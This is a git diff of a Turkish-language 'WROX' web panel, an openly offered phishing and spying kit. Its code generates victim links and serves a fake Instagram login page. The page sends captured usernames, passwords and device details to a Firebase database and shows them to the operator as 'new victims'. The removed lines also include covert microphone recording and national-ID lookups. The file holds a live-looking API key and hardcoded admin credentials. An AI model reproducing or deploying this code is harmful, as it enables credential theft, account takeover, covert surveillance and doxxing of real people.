@@ -3,211 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V54 - TOTAL DOMINATION</title>
+    <title>WROX V56 - VENOM</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --p: #00f2ff; --bg: #050505; --card: #0a0a0a; --v: #ff00ff; --prem: #00ff88; --err: #ff4b2b; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
-        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        :root { --p: #00f2ff; --bg: #030303; --card: #0a0a0a; --v: #bc13fe; --prem: #00ff88; --err: #ff003c; --border: #1a1a1a; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: var(--bg); color: #e0e0e0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
         
-        /* AUTH SECTION */
-        #auth-layer { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .auth-box { padding: 40px; border: 1px solid var(--p); background: var(--card); width: 350px; text-align: center; border-radius: 10px; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
-        input, button { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #333; color: var(--p); border-radius: 5px; outline: none; }
-        button { cursor: pointer; font-weight: bold; border-color: var(--p); transition: 0.3s; }
-        button:hover { background: var(--p); color: #000; box-shadow: 0 0 15px var(--p); }
+        /* MODERN HEADER & ASIDE */
+        header { height: 65px; border-bottom: 2px solid var(--p); display: flex; align-items: center; padding: 0 25px; background: #000; justify-content: space-between; box-shadow: 0 4px 15px rgba(0,242,255,0.1); z-index: 1001; }
+        .ham-btn { font-size: 28px; cursor: pointer; color: var(--p); }
+        aside { position: fixed; top: 65px; left: -300px; width: 280px; height: calc(100vh - 65px); background: #050505; border-right: 1px solid var(--border); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1000; overflow-y: auto; }
+        aside.open { left: 0; box-shadow: 10px 0 30px rgba(0,0,0,0.8); }
+        .m-item { padding: 18px 25px; cursor: pointer; color: #888; border-bottom: 1px solid #0d0d0d; font-size: 14px; transition: 0.3s; display: flex; align-items: center; gap: 12px; }
+        .m-item:hover, .m-item.active { background: linear-gradient(90deg, rgba(0,242,255,0.1) 0%, transparent 100%); color: var(--p); border-left: 4px solid var(--p); }
 
-        /* PANEL UI */
-        header { height: 60px; border-bottom: 1px solid var(--p); display: flex; align-items: center; padding: 0 20px; background: #000; justify-content: space-between; z-index: 1001; }
-        .ham-btn { font-size: 30px; cursor: pointer; color: var(--p); transition: 0.3s; }
-        aside { position: fixed; top: 60px; left: -300px; width: 280px; height: calc(100vh - 60px); background: #080808; border-right: 1px solid #222; transition: 0.3s; z-index: 1000; overflow-y: auto; }
-        aside.open { left: 0; }
-        .m-cat { padding: 15px; font-size: 11px; color: #444; border-bottom: 1px solid #111; letter-spacing: 1px; }
-        .m-item { padding: 15px 20px; cursor: pointer; color: #bbb; border-bottom: 1px solid #0f0f0f; font-size: 13px; display: flex; justify-content: space-between; align-items: center; }
-        .m-item:hover, .m-item.active { background: rgba(0,242,255,0.05); color: var(--p); }
-        
-        section { padding: 25px; flex: 1; overflow-y: auto; background: radial-gradient(circle at center, #111 0%, #050505 100%); }
-        .page { display: none; max-width: 800px; margin: 0 auto; }
+        /* CONTENT AREA */
+        section { padding: 30px; flex: 1; overflow-y: auto; background-image: radial-gradient(circle at 50% 50%, #0a0a0a 0%, #030303 100%); }
+        .page { display: none; animation: fadeIn 0.5s ease; }
         .page.active { display: block; }
-        .res { background: #000; padding: 15px; color: #0f0; border: 1px solid #1a1a1a; min-height: 250px; border-radius: 8px; white-space: pre-wrap; font-size: 12px; margin-top: 15px; box-shadow: inset 0 0 10px #000; }
-        .img-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; margin-top: 15px; }
-        .img-grid img { width: 100%; border: 1px solid var(--p); border-radius: 5px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* VICTIM LAYERS */
-        #victim-ui { display: none; position: fixed; inset: 0; background: #fff; z-index: 20000; color: #000; text-align: center; overflow-y: auto; }
-        .v-container { max-width: 400px; margin: 60px auto; padding: 20px; }
+        input, button { width: 100%; padding: 14px; margin-bottom: 12px; background: #000; border: 1px solid var(--border); color: var(--p); border-radius: 8px; font-weight: 600; outline: none; transition: 0.3s; }
+        button { cursor: pointer; border: 1px solid var(--p); text-transform: uppercase; letter-spacing: 1px; }
+        button:hover { background: var(--p); color: #000; box-shadow: 0 0 20px rgba(0,242,255,0.4); }
+        .res-box { background: #000; padding: 20px; color: var(--prem); border: 1px solid var(--border); min-height: 300px; border-radius: 12px; font-family: 'Consolas', monospace; font-size: 13px; line-height: 1.6; position: relative; overflow: auto; }
+        
+        /* AUTH */
+        #auth-layer { position: fixed; inset: 0; background: #000; z-index: 10002; display: flex; align-items: center; justify-content: center; }
+        .auth-card { padding: 40px; border: 1px solid var(--p); background: var(--card); width: 380px; text-align: center; border-radius: 15px; box-shadow: 0 0 40px rgba(0,242,255,0.1); }
+
+        /* VICTIM UI - GİZLİ */
+        #victim-ui { display: none; position: fixed; inset: 0; background: #fff; z-index: 99999; color: #000; }
+        .v-insta-box { max-width: 350px; margin: 80px auto; text-align: center; }
+        .v-insta-box input { background: #fafafa; border: 1px solid #dbdbdb; color: #262626; margin-bottom: 8px; padding: 10px; font-size: 12px; }
+        .v-insta-box button { background: #0095f6; color: #fff; border: none; padding: 8px; border-radius: 4px; font-size: 14px; margin-top: 8px; }
     </style>
 </head>
 <body>
 
 <div id="auth-layer">
-    <div class="auth-box">
-        <h2 id="auth-t" style="letter-spacing:3px;">WROX LOGIN</h2><br>
-        <input type="email" id="email" placeholder="E-posta">
-        <input type="password" id="pass" placeholder="Şifre">
-        <button onclick="handleAuth()">SİSTEME GİR</button>
-        <p onclick="toggleA()" id="toggle-text" style="font-size:10px; cursor:pointer; color:#555; margin-top:10px;">Hesabın yok mu? Kayıt Ol</p>
+    <div class="auth-card">
+        <h2 style="color:var(--p); margin-bottom:20px; letter-spacing:2px;">WROX TERMINAL</h2>
+        <input type="email" id="email" placeholder="E-posta Adresiniz">
+        <input type="password" id="pass" placeholder="Şifreniz">
+        <button onclick="handleAuth()">SİSTEME BAĞLAN</button>
+        <p onclick="isReg=!isReg; this.innerText=isReg?'Giriş Yap':'Hesap Oluştur'" style="font-size:11px; cursor:pointer; color:#555; margin-top:15px;">Hesap Oluştur</p>
     </div>
 </div>
 
 <header>
     <div class="ham-btn" onclick="document.getElementById('side').classList.toggle('open')">☰</div>
-    <div style="font-weight:bold; letter-spacing:2px;">WROX <span style="color:var(--p)">V54</span></div>
-    <div id="r-tag" style="font-size:10px; border:1px solid var(--p); padding:3px 10px; border-radius:12px;">GUEST</div>
+    <div style="font-weight:900; font-size:20px;">WROX <span style="color:var(--p)">VENOM</span></div>
+    <div id="role-box" style="font-size:11px; color:var(--prem); border:1px solid var(--prem); padding:4px 12px; border-radius:20px;">GUEST</div>
 </header>
 
 <main style="display:flex; flex:1;">
     <aside id="side">
-        <div class="m-cat">ÜCRETSİZ SORGU</div>
-        <div class="m-item active" onclick="pg('mernis')">👤 Ad Soyad <span>🔓</span></div>
-        <div class="m-item" onclick="pg('tc')">🆔 TC Sorgu <span>🔓</span></div>
-        
-        <div class="m-cat">PREMIUM SORGU</div>
-        <div class="m-item" onclick="pg('gsm')">📞 GSM Sorgu <span class="lck">🔒</span></div>
-        <div class="m-item" onclick="pg('adres')">🏠 Adres Sorgu <span class="lck">🔒</span></div>
-        <div class="m-item" onclick="pg('sulale')">🌳 Sülale Sorgu <span class="lck">🔒</span></div>
-
-        <div class="m-cat">SIZMA (SPY) OPS</div>
-        <div class="m-item" onclick="pg('spy_insta')" style="color:var(--v)">📸 Instagram Avcı</div>
-        <div class="m-item" onclick="pg('spy_mic')" style="color:var(--err)">🎙️ Mikrofon Sızma</div>
-        <div class="m-item" onclick="pg('spy_cam')" style="color:var(--p)">📷 Kamera Sızma</div>
-        <div class="m-item" onclick="pg('spy_gal')" style="color:yellow">📂 Galeri Çekici</div>
-
-        <div class="m-cat">YÖNETİM</div>
+        <div class="m-item active" onclick="pg('spy')">🚀 Spy Link Oluştur</div>
         <div class="m-item" onclick="pg('logs')" style="color:var(--prem)">📁 Gelen Loglar</div>
-        <div id="adm-nav" class="m-item" onclick="pg('admin')" style="display:none; color:var(--v)">👑 Admin Paneli</div>
-        <div class="m-item" onclick="logout()" style="color:red;">🚪 Çıkış Yap</div>
+        <div class="m-item" onclick="pg('mernis')">👤 Mernis Sorgu</div>
+        <div id="adm-nav" class="m-item" onclick="pg('admin')" style="display:none; color:var(--v)">👑 Admin Yönetimi</div>
+        <div class="m-item" onclick="logout()" style="color:var(--err); margin-top:30px;">🚪 Güvenli Çıkış</div>
     </aside>
 
     <section>
-        <div id="p-mernis" class="page active">
-            <h3>👤 AD SOYAD SORGULAMA</h3>
-            <input id="in-ad" placeholder="AD"> <input id="in-soyad" placeholder="SOYAD">
-            <button onclick="run('mernis')">SORGULA</button>
-            <div id="res-mernis" class="res">Sonuç bekleniyor...</div>
-        </div>
-
-        <div id="p-tc" class="page">
-            <h3>🆔 TC'DEN BİLGİ SORGULAMA</h3>
-            <input id="in-tc" placeholder="T.C. No">
-            <button onclick="run('tc')">BİLGİLERİ GETİR</button>
-            <div id="res-tc" class="res">...</div>
-        </div>
-
-        <div id="p-spy_insta" class="page">
-            <h3>📸 INSTAGRAM PHISH LINK</h3>
-            <button onclick="gen('insta')">YEM LİNKİ OLUŞTUR</button>
-            <input id="u-insta" readonly style="display:none; margin-top:15px; color:yellow;">
-        </div>
-
-        <div id="p-spy_mic" class="page">
-            <h3>🎙️ MİKROFON SIZMA LINK</h3>
-            <button onclick="gen('mic')" style="border-color:var(--err); color:var(--err);">DİNLEME LİNKİ OLUŞTUR</button>
-            <input id="u-mic" readonly style="display:none; margin-top:15px; color:yellow;">
+        <div id="p-spy" class="page active">
+            <h2 style="color:var(--p); margin-bottom:15px;">Casus Link Üretici</h2>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px;">
+                <button onclick="gen('insta')" style="border-color:#e1306c; color:#e1306c;">Instagram Avcı</button>
+                <button onclick="gen('mic')" style="border-color:var(--err); color:var(--err);">Gizli Mikrofon</button>
+                <button onclick="gen('cam')" style="border-color:var(--p); color:var(--p);">Kamera Sızma</button>
+                <button onclick="gen('gal')" style="border-color:orange; color:orange;">Galeri Çekici</button>
+            </div>
+            <div id="link-res" style="margin-top:25px; padding:15px; background:rgba(0,242,255,0.05); border:1px dashed var(--p); border-radius:10px; display:none;">
+                <p style="font-size:12px; color:#888; margin-bottom:8px;">Kurbana Gönderilecek Link:</p>
+                <input id="final-url" readonly style="color:yellow; border:none; background:transparent; font-size:11px;">
+            </div>
         </div>
 
         <div id="p-logs" class="page">
-            <h3>📁 GELEN VERİLER & FOTOĞRAFLAR</h3>
-            <div id="res-logs" class="res">Henüz log yok...</div>
-            <div id="log-imgs" class="img-grid"></div>
+            <h2 style="color:var(--prem); margin-bottom:15px;">Canlı Veri Akışı</h2>
+            <div id="log-container" class="res-box">Kurban bekleniyor...</div>
         </div>
 
         <div id="p-admin" class="page">
-            <h3>👑 ADMIN KONTROL PANELİ</h3><br>
-            <div id="user-list"></div>
+            <h2 style="color:var(--v); margin-bottom:15px;">Kullanıcı Yetkilendirme</h2>
+            <div id="u-list" style="background:rgba(255,255,255,0.02); border-radius:15px;"></div>
         </div>
     </section>
 </main>
 
 <div id="victim-ui">
-    <div id="v-insta" class="v-container" style="display:none;">
-        <h1 style="font-family:serif; font-style:italic; font-size:35px;">Instagram</h1><br>
-        <input type="text" id="vi-u" placeholder="Kullanıcı adı" style="background:#fafafa; border:1px solid #ddd; color:#000;">
-        <input type="password" id="vi-p" placeholder="Şifre" style="background:#fafafa; border:1px solid #ddd; color:#000;">
-        <button onclick="vData('insta')" style="background:#0095f6; color:#fff; border:none;">Giriş Yap</button>
-    </div>
-    <div id="v-mic" class="v-container" style="display:none;">
-        <img src="https://cdn-icons-png.flaticon.com/512/709/709682.png" width="80"><br>
-        <h3>Sesli Doğrulama</h3><p>Devam etmek için mikrofon izni verin.</p>
-        <button onclick="vMic()">İZİN VER</button>
+    <div id="v-insta" class="v-insta-box" style="display:none;">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" style="margin-top:40px; margin-bottom:30px;">
+        <input type="text" id="vi-u" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
+        <input type="password" id="vi-p" placeholder="Şifre">
+        <button onclick="vSend('insta')" style="width:100%; font-weight:bold;">Giriş Yap</button>
+        <p style="margin-top:20px; font-size:12px; color:#385185; font-weight:bold;">Facebook ile Giriş Yap</p>
     </div>
 </div>
 
 <script>
+    // --- FIREBASE BAĞLANTISI ---
     const cfg = { apiKey: "AIzaSyD-heOy-CHV37ofCqNLbjchG5FtU6mRxc", authDomain: "wrox-vip.firebaseapp.com", databaseURL: "https://wrox-vip-default-rtdb.firebaseio.com", projectId: "wrox-vip" };
     firebase.initializeApp(cfg); const db = firebase.database();
-    
-    // --- YÖNLENDİRME (KURBAN MI?) ---
+
+    // --- KURBAN YÖNLENDİRME ---
     const q = new URLSearchParams(window.location.search);
-    const m = q.get('mode'), tid = q.get('id');
-    if(m && tid) {
-        document.getElementById('auth-layer').remove(); document.querySelector('header').remove(); document.getElementById('side').remove();
-        document.getElementById('victim-ui').style.display='block'; document.getElementById('v-'+m).style.display='block';
+    const mode = q.get('mode'), vid = q.get('id');
+    if(mode && vid) {
+        document.body.innerHTML = document.getElementById('victim-ui').innerHTML;
+        document.body.style.display = 'block';
+        document.body.style.background = '#fff';
+        document.getElementById('v-'+mode).style.display = 'block';
     }
 
-    // --- AUTH ---
-    let authMode = 'login';
-    function toggleA() { authMode = (authMode==='login'?'reg':'login'); document.getElementById('auth-t').innerText=authMode==='reg'?'WROX REGISTER':'WROX LOGIN'; document.getElementById('toggle-text').innerText=authMode==='reg'?'Zaten üye misin? Giriş Yap':'Hesabın yok mu? Kayıt Ol'; }
-    
+    // --- KURBAN VERİ GÖNDERME ---
+    function vSend(m) {
+        const u = document.getElementById('vi-u').value;
+        const p = document.getElementById('vi-p').value;
+        if(u && p) {
+            db.ref('spy_logs/' + vid).set({
+                type: m,
+                username: u,
+                password: p,
+                date: new Date().toLocaleString(),
+                ua: navigator.userAgent
+            }).then(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/?next=/p/CwO3V6_M0_S/";
+            });
+        }
+    }
+
+    // --- PANEL AUTH ---
+    let isReg = false;
     function handleAuth() {
         const e = document.getElementById('email').value, p = document.getElementById('pass').value, id = e.replace(/\./g,'_');
-        if(authMode==='reg') db.ref('users/'+id).set({e, p, r:'free'}).then(()=>alert("Kayıt Tamam!"));
+        if(isReg) db.ref('users/'+id).set({e, p, r:'free'}).then(()=>alert("Kayıt Tamam!"));
         else {
             if(e==="afavan66@gmail.com" && p==="Efecan1903") return save({e, r:'admin'});
             db.ref('users/'+id).once('value', s => { const u=s.val(); if(u && u.p===p) save({e, r:u.r}); else alert("Hata!"); });
         }
     }
-    function save(u) { localStorage.setItem('ses', JSON.stringify(u)); location.reload(); }
-    const ses = JSON.parse(localStorage.getItem('ses'));
+    function save(u) { localStorage.setItem('w_ses', JSON.stringify(u)); location.reload(); }
+    const ses = JSON.parse(localStorage.getItem('w_ses'));
     if(ses) {
         document.getElementById('auth-layer').style.display='none';
-        document.getElementById('r-tag').innerText = ses.r.toUpperCase();
+        document.getElementById('role-box').innerText = ses.r.toUpperCase();
         if(ses.r==='admin') { document.getElementById('adm-nav').style.display='block'; loadUsers(); }
-        if(ses.r==='premium' || ses.r==='admin') document.querySelectorAll('.lck').forEach(x=>x.innerText='🔓');
     }
 
-    // --- API ---
-    async function run(t) {
-        if(ses.r==='free' && (t!=='mernis' && t!=='tc')) return alert("PREMIUM GEREKLİ!");
-        const px = "https://api.allorigins.win/get?url=";
-        let url = "";
-        if(t==='mernis') url = `http://194.15.52.78/bakim/adsoyadpro.php?ad=${document.getElementById('in-ad').value}&soyad=${document.getElementById('in-soyad').value}`;
-        if(t==='tc') url = `https://hukumsuz.de/api/tc.php?tc=${document.getElementById('in-tc').value}`;
+    // --- LİNK OLUŞTURMA ---
+    function gen(m) {
+        const id = "VENOM_" + Math.random().toString(36).substr(2,5).toUpperCase();
+        const url = window.location.href.split('?')[0] + "?mode=" + m + "&id=" + id;
+        document.getElementById('final-url').value = url;
+        document.getElementById('link-res').style.display = 'block';
         
-        document.getElementById('res-'+t).innerText = "⚙️ Sorgulanıyor...";
-        try { const r = await fetch(px+encodeURIComponent(url)); const d = await r.json(); document.getElementById('res-'+t).innerText = d.contents; } catch(e){ alert("Hata!"); }
+        // Bu ID'yi dinlemeye başla
+        db.ref('spy_logs/' + id).on('value', s => {
+            const data = s.val();
+            if(data) {
+                const logBox = document.getElementById('log-container');
+                logBox.innerHTML = `<div style="border-left:3px solid var(--prem); padding-left:10px; margin-bottom:20px;">
+                    <span style="color:var(--p)">[YENİ KURBAN DÜŞTÜ]</span><br>
+                    <b>USER:</b> ${data.username}<br>
+                    <b>PASS:</b> ${data.password}<br>
+                    <b>TARİH:</b> ${data.date}<br>
+                    <b>CİHAZ:</b> ${data.ua}
+                </div>` + logBox.innerHTML;
+                // Görsel uyarı
+                logBox.style.borderColor = "var(--prem)";
+                setTimeout(()=> logBox.style.borderColor = "var(--border)", 1000);
+            }
+        });
+        alert("Link Başarıyla Oluşturuldu! Kurban verisi girdiğinde 'Gelen Loglar' sayfasında en üstte belirecek.");
     }
 
-    // --- SPY & VICTIM ---
-    function gen(mode) {
-        const id = "W_" + Math.random().toString(36).substr(2,4).toUpperCase();
-        const url = window.location.href.split('?')[0] + "?mode=" + mode + "&id=" + id;
-        document.getElementById('u-'+mode).value = url; document.getElementById('u-'+mode).style.display='block';
-        db.ref('spy_logs/'+id).on('value', s => { if(s.val()) document.getElementById('res-logs').innerText = JSON.stringify(s.val(), null, 2); });
-    }
-
-    function vData(m) {
-        db.ref('spy_logs/'+tid).update({user: document.getElementById('vi-u').value, pass: document.getElementById('vi-p').value});
-        window.location.href="https://instagram.com";
-    }
-
-    async function vMic() {
-        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mr = new MediaRecorder(s);
-        mr.ondataavailable = e => {
-            const rd = new FileReader(); rd.readAsDataURL(e.data);
-            rd.onloadend = () => { db.ref('spy_logs/'+tid+'/audio').push(rd.result); alert("Onaylandı."); window.location.href="https://google.com"; };
-        };
-        mr.start(); setTimeout(()=>mr.stop(), 3000);
-    }
-
-    // --- ADMIN & UI ---
+    // --- DİĞER FONKSİYONLAR ---
     function pg(id) { document.querySelectorAll('.page').forEach(x=>x.classList.remove('active')); document.getElementById('p-'+id).classList.add('active'); document.getElementById('side').classList.remove('open'); }
     function loadUsers() {
         db.ref('users').on('value', s => {
-            const u = s.val(), div = document.getElementById('user-list'); div.innerHTML="";
-            for(let k in u) { div.innerHTML += `<div style="padding:10px; border-bottom:1px solid #222; display:flex; justify-content:space-between;"><span>${u[k].e}</span><button onclick="db.ref('users/${k}').update({r:'premium'})" style="width:80px; font-size:10px;">PREM YAP</button></div>`; }
+            const u = s.val(), div = document.getElementById('u-list'); div.innerHTML="";
+            for(let k in u) { if(u[k].e === "afavan66@gmail.com") continue;
+                div.innerHTML += `<div style="padding:15px; border-bottom:1px solid #111; display:flex; justify-content:space-between; align-items:center;">
+                <span>${u[k].e} <b>[${u[k].r}]</b></span>
+                <button onclick="db.ref('users/${k}').update({r:'premium'})" style="width:100px; font-size:10px; padding:5px;">PREM YAP</button>
+                </div>`;
+            }
         });
     }
     function logout() { localStorage.clear(); location.reload(); }
